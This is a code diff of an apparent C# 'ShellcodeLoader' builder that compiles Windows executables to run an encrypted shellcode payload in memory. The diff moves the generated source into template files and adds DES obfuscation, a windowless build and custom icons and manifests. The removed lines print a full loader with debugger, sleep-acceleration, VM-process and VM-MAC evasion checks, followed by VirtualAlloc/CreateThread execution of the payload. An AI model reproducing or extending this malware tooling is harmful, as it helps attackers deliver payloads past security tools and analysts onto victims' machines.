@@ -20,12 +20,19 @@ namespace ShellcodeLoader
         public static string bobPrivateKey;
         public static string bobPublicKey;
 
+        string ReadFile(string path)
+        {
+            StreamReader sr = new StreamReader(path);
+            string text = sr.ReadToEnd();
+            sr.Close();
+            return text;
+        }
+
         static string OpenFile()
         {
             OpenFileDialog openFileDialog = new OpenFileDialog
             {
                 Filter = "Binary Files (*.bin)|*.bin",
-                InitialDirectory = Environment.CurrentDirectory,
                 RestoreDirectory = true
             };
             if (openFileDialog.ShowDialog() == DialogResult.OK)
@@ -113,8 +120,43 @@ namespace ShellcodeLoader
             }
             return encryptedData;
         }
+        public string Encrypt(string pToEncrypt, string key, string iv)
+        {
+            DESCryptoServiceProvider descryptoServiceProvider = new DESCryptoServiceProvider();
+            descryptoServiceProvider.Key = Encoding.ASCII.GetBytes(key);
+            descryptoServiceProvider.IV = Encoding.ASCII.GetBytes(iv);
+            byte[] bytes = Encoding.Default.GetBytes(pToEncrypt);
+            MemoryStream memoryStream = new MemoryStream();
+            CryptoStream cryptoStream = new CryptoStream(memoryStream, descryptoServiceProvider.CreateEncryptor(), CryptoStreamMode.Write);
+            cryptoStream.Write(bytes, 0, bytes.Length);
+            cryptoStream.FlushFinalBlock();
+            StringBuilder stringBuilder = new StringBuilder();
+            foreach (byte b in memoryStream.ToArray())
+            {
+                stringBuilder.AppendFormat("{0:X2}", b);
+            }
+            stringBuilder.ToString();
+            return stringBuilder.ToString();
+        }
 
-        public static void CompileCode(int platform, string privateKey, string encryptData)
+        public string RandomText(int length)
+        {
+            string outputText = "";
+            string charList = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+            string[] charListArray = new string[charList.Length];
+            for (int i = 0; i < charList.Length; i++)
+            {
+                charListArray[i] = charList.Substring(i, 1);
+            }
+            Random random = new Random();
+            for (int i = 0; i < length; i++)
+            {
+                outputText += charListArray[random.Next(0, charListArray.Length - 1)];
+            }
+            return outputText;
+        }
+
+        public void CompileCode(int platform, string privateKey, string encryptData)
         {
             if (encryptData != "")
             {
@@ -126,248 +168,108 @@ namespace ShellcodeLoader
                 CompilerParameters parameters = new CompilerParameters();
                 parameters.GenerateExecutable = true;
                 parameters.GenerateInMemory = false;
+                parameters.CompilerOptions = "-target:winexe";
+                if (checkBox1.Checked)
+                {
+                    parameters.CompilerOptions += " -win32manifest:Resources\\app.manifest";
+                }
+                if (checkBox7.Checked)
+                {
+                    parameters.CompilerOptions += " -win32icon:Resources\\Icon.ico";
+                }
                 if (platform == 32)
                 {
-                    parameters.CompilerOptions = "-platform:x86";
+                    parameters.CompilerOptions += " -platform:x86";
                 }
                 else if (platform == 64)
                 {
-                    parameters.CompilerOptions = "-platform:x64";
+                    parameters.CompilerOptions += " -platform:x64";
                 }
                 string path = "shellcode" + platform + ".exe";
                 parameters.OutputAssembly = path;
                 parameters.ReferencedAssemblies.Add("System.dll");
-                string sourceCode = @"
-using System;
-using System.Collections;
-using System.Diagnostics;
-using System.Runtime.InteropServices;
-using System.Security.Cryptography;
-using System.Text;
-using System.Threading;
-
-namespace shellcode
-{
-    class Program
-    {
-        static int get_current_time()
-        {
-            DateTime dt = DateTime.Now;
-            return dt.Minute;
-        }
-
-        static bool check_sleep_acceleration()
-        {
-            int first = get_current_time();
-            Thread.Sleep(120000);
-            int second = get_current_time();
-            if (second - first != 2)
-            {
-                return true;
-            }
-            return false;
-        }
-
-        static string execute_process(string file, string args = """")
-        {
-            Process process = new Process();
-            process.StartInfo.FileName = file;
-            process.StartInfo.CreateNoWindow = true;
-            process.StartInfo.UseShellExecute = false;
-            process.StartInfo.RedirectStandardInput = true;
-            process.StartInfo.RedirectStandardOutput = true;
-            process.StartInfo.RedirectStandardError = true;
-            process.StartInfo.Arguments = args;
-            process.Start();
-            string output = process.StandardOutput.ReadToEnd();
-            process.WaitForExit();
-            process.Close();
-            return output;
-        }
-
-        static bool check_process_running()
-        {
-            string[] blacklist = { ""vmsrvc"", ""tcpview"", ""wireshark"", ""visual basic"", ""fiddler"", ""vmware"", ""vbox"", ""process explorer"", ""autoit"", ""vboxtray"", ""vmtools"", ""vmrawdsk"", ""vmusbmouse"", ""vmvss"", ""vmscsi"", ""vmxnet"", ""vmx_svga"", ""vmmemctl"", ""df5serv"", ""vboxservice"", ""vmhgfs"", ""vmtoolsd"" };
-            string process = execute_process(""tasklist.exe"", ""/svc"");
-            foreach (var name in blacklist)
-            {
-                if (process.Contains(name))
+                string sourceCode = "";
+                if (radioButton1.Checked)
                 {
-                    return true;
-                }
-            }
-            return false;
-        }
-
-        static bool checks_mac_address()
-        {
-            string[] blacklist = { ""080027"", ""000569"", ""000C29"", ""001C14"", ""005056"", ""001C42"", ""00163E"", ""0A0027"" };
-            string mac = execute_process(""getmac.exe"").Replace(""-"", """").Replace("":"", """");
-            foreach (var name in blacklist)
-            {
-                if (mac.Contains(name))
-                {
-                    return true;
-                }
-            }
-            return false;
-        }
-
-        static void Main(string[] args)
-        {
-            if (Debugger.IsAttached)
-            {
-                Console.WriteLine(""Debugger Found"");
-                Environment.Exit(0);
-            }
-
-            if (check_sleep_acceleration())
-            {
-                Console.WriteLine(""Sleep Found"");
-                Environment.Exit(0);
-            }
-
-            if (check_process_running())
-            {
-                Console.WriteLine(""Process Found"");
-                Environment.Exit(0);
-            }
-
-            if (checks_mac_address())
-            {
-                Console.WriteLine(""Mac Found"");
-                Environment.Exit(0);
-            }
-
-            RSACryptoServiceProvider rsa = new RSACryptoServiceProvider();
-            rsa.FromXmlString(""" + privateKey;
-                sourceCode += @""");
-            byte[] encryptedData = Convert.FromBase64String(""" + encryptData;
-                sourceCode += @""");
-            byte[] decryptedData = null;
-            int DecryptedSize = 0;
-            if (encryptedData.Length > 128)
-            {
-                ArrayList arrDecrypteToTxt = new ArrayList();
-                decryptedData = DecryptedDataMethod(rsa, encryptedData, arrDecrypteToTxt, DecryptedSize);
-            }
-            else
-            {
-                decryptedData = rsa.Decrypt(encryptedData, false);
-            }
-            string payload = Encoding.Default.GetString(decryptedData);
-            byte[] mydata = Convert.FromBase64String(payload);
-            UInt32 funcAddr = VirtualAlloc(0, (UInt32)mydata.Length,
-                MEM_COMMIT, PAGE_READWRITE);
-            Marshal.Copy(mydata, 0, (IntPtr)(funcAddr), mydata.Length);
-            uint oldprotection;
-            VirtualProtect((IntPtr)(funcAddr), mydata.Length, PAGE_EXECUTE, out oldprotection);
-            IntPtr hThread = IntPtr.Zero;
-            UInt32 threadId = 0;
-            IntPtr pinfo = IntPtr.Zero;
-            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
-            WaitForSingleObject(hThread, 0xFFFFFFFF);
-        }
-        private static UInt32 MEM_COMMIT = 0x1000;
-        private static UInt32 PAGE_READWRITE = 0x04;
-        private static UInt32 PAGE_EXECUTE = 0x10;
-        [DllImport(""kernel32"")]
-        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
-            UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
-
-        [DllImport(""kernel32"")]
-        static extern bool VirtualProtect(IntPtr lpAddress, int dwSize, uint flNewProtect, out uint lpflOldProtect);
-        [DllImport(""kernel32"")]
-        private static extern IntPtr CreateThread(
-            UInt32 lpThreadAttributes,
-            UInt32 dwStackSize,
-            UInt32 lpStartAddress,
-            IntPtr param,
-            UInt32 dwCreationFlags,
-            ref UInt32 lpThreadId
-        );
-        [DllImport(""kernel32"")]
-        private static extern UInt32 WaitForSingleObject(
-            IntPtr hHandle,
-            UInt32 dwMilliseconds
-        );
-        private static byte[] DecryptedDataMethod(RSACryptoServiceProvider rsa, byte[] orgData, ArrayList arrDecrypteToTxt, int DecryptedSize)
-        {
-            byte[] DecryptedData = null;
-            try
-            {
-                string strDecrypteToTxt = """";
-                byte[] temp = null;
-                byte[] tempDecryptedData = null;
-                if (orgData.Length > 128)
-                {
-                    temp = new byte[128];
-                    for (int i = 0; i < 128; i++)
-                    {
-                        temp[i] = orgData[i];
-                    }
+                    string key = RandomText(8), iv = RandomText(8);
+                    encryptData = Encrypt(encryptData, key, iv);
+                    privateKey = Encrypt(privateKey, key, iv);
+                    sourceCode = ReadFile("Template\\General.tpl");
+                    sourceCode = sourceCode.Replace("{{Decrypt_Key_Here}}", key);
+                    sourceCode = sourceCode.Replace("{{Decrypt_IV_Here}}", iv);
+                    sourceCode = sourceCode.Replace("{{PrivateKey_Here}}", privateKey);
+                    sourceCode = sourceCode.Replace("{{EncryptData_Here}}", encryptData);
                 }
                 else
                 {
-                    temp = orgData;
-                }
-                tempDecryptedData = rsa.Decrypt(temp, false);
-                DecryptedSize += tempDecryptedData.Length;
-                strDecrypteToTxt = Convert.ToBase64String(tempDecryptedData);
-                arrDecrypteToTxt.Add(strDecrypteToTxt);
-
-                if (orgData.Length > 128)
-                {
-                    byte[] again = new byte[orgData.Length - 128];
-                    int j = 0;
-                    for (int i = 128; i < orgData.Length; i++)
+                    sourceCode = ReadFile("Template\\Argument.tpl");
+                    using (StreamWriter sw = new StreamWriter("Output.txt"))
                     {
-                        again[j] = orgData[i];
-                        j++;
+                        sw.WriteLine("Private Key:");
+                        sw.WriteLine(privateKey);
+                        sw.WriteLine("");
+                        sw.WriteLine("Encrypt Data:");
+                        sw.WriteLine(encryptData);
+                        sw.WriteLine("");
+                        sw.WriteLine("Usage: shellcode.exe \"Private Key\" \"Encrypt Data\"");
+                        sw.Flush();
+                        sw.Close();
                     }
-                    return DecryptedDataMethod(rsa, again, arrDecrypteToTxt, DecryptedSize);
+                }
+
+                if (checkBox2.Checked)
+                {
+                    sourceCode = sourceCode.Replace("{{CheckDebugger_Here}}", ReadFile("Template\\Debugger.tpl"));
                 }
                 else
                 {
-                    DecryptedData = new byte[DecryptedSize];
-                    Byte[] btFromBase64 = null;
-
-                    int p = 1;
-                    int currentAddr = 0;
-                    int k = 0;
-                    double dk = 0;
-                    dk = Math.Floor((double)(DecryptedSize / 117));
-                    k = (int)dk;
-                    int n = 0;
-                    foreach (string strArr in arrDecrypteToTxt)
-                    {
-                        if (n < k)
-                        {
-                            btFromBase64 = Convert.FromBase64String(strArr);
-                            btFromBase64.CopyTo(DecryptedData, n * 117);
-                            currentAddr = p * 117;
-                            p++;
-                            n++;
-                        }
-                        else
-                        {
-                            btFromBase64 = Convert.FromBase64String(strArr);
-                            btFromBase64.CopyTo(DecryptedData, currentAddr);
-                        }
-
-                    }
+                    sourceCode = sourceCode.Replace("{{CheckDebugger_Here}}", "");
                 }
 
-            }
-            catch (Exception ex)
-            {
-                throw new Exception(ex.Message);
-            }
-            return DecryptedData;
-        }
-    }
-}
-        ";
+                if (checkBox3.Checked)
+                {
+                    sourceCode = sourceCode.Replace("{{CheckProcessMethod_Here}}", ReadFile("Template\\ProcessMethod.tpl"));
+                    sourceCode = sourceCode.Replace("{{CheckProcess_Here}}", ReadFile("Template\\Process.tpl"));
+                }
+                else
+                {
+                    sourceCode = sourceCode.Replace("{{CheckProcessMethod_Here}}", "");
+                    sourceCode = sourceCode.Replace("{{CheckProcess_Here}}", "");
+                }
+
+                if (checkBox4.Checked)
+                {
+                    sourceCode = sourceCode.Replace("{{CheckDelayMethod_Here}}", ReadFile("Template\\DelayMethod.tpl"));
+                    sourceCode = sourceCode.Replace("{{CheckDelay_Here}}", ReadFile("Template\\Delay.tpl"));
+                }
+                else
+                {
+                    sourceCode = sourceCode.Replace("{{CheckDelayMethod_Here}}", "");
+                    sourceCode = sourceCode.Replace("{{CheckDelay_Here}}", "");
+                }
+
+                if (checkBox5.Checked)
+                {
+                    sourceCode = sourceCode.Replace("{{CheckMACMethod_Here}}", ReadFile("Template\\MACMethod.tpl"));
+                    sourceCode = sourceCode.Replace("{{CheckMAC_Here}}", ReadFile("Template\\MAC.tpl"));
+                }
+                else
+                {
+                    sourceCode = sourceCode.Replace("{{CheckMACMethod_Here}}", "");
+                    sourceCode = sourceCode.Replace("{{CheckMAC_Here}}", "");
+                }
+
+                if (checkBox6.Checked)
+                {
+                    sourceCode = sourceCode.Replace("{{CheckDiskMethod_Here}}", ReadFile("Template\\DiskMethod.tpl"));
+                    sourceCode = sourceCode.Replace("{{CheckDisk_Here}}", ReadFile("Template\\Disk.tpl"));
+                }
+                else
+                {
+                    sourceCode = sourceCode.Replace("{{CheckDiskMethod_Here}}", "");
+                    sourceCode = sourceCode.Replace("{{CheckDisk_Here}}", "");
+                }
+
                 CompilerResults cr = provider.CompileAssemblyFromSource(parameters, sourceCode);
                 if (cr.Errors.Count > 0)
                 {
